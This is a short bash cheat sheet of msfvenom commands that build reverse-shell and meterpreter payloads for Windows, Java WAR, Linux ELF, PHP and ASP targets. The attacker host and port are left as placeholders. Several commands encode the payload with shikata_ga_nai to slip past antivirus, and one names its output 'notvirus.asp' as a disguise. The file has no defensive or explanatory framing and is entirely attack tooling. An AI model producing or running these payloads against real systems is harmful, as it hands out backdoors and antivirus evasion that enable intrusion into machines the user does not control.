#!/bin/bash
# Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[IP] lport=[PORT] -f .exe -o [output.exe]
# Java
msfvenom -p java/jsp_shell_reverse_tcp lhost=[IP] lport=[PORT] -f .war -o [output.war]
# Linux
msfvenom --smallest -b '\x00\x0a\x0d\x20' -p linux/x86/shell/reverse_tcp lhost=[IP] lport=[PORT] -e x86/shikata_ga_nai -i 10 -f elf -o [output.elf] # [WIP]
# PHP
msfvenom -p php/meterpreter/reverse_tcp lhost=[IP] lport=[PORT] -f raw > [output.php]
# Encoded:
msfvenom -p windows/shell/reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=[IP] LPORT=[PORT] -f asp > notvirus.asp
